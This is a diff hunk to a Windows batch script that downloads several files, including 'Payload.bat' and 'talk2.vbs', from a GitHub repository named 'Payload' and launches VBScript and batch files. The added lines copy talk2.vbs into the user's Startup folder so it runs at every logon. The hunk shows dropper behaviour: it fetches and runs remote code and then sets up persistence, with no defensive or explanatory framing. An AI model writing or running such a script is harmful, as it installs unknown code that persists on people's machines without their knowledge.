@@ -5,6 +5,8 @@ curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs
+@echo off
+copy "./talk2.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 start talk.vbs
 start fileadder.bat
 timeout 3 > nul
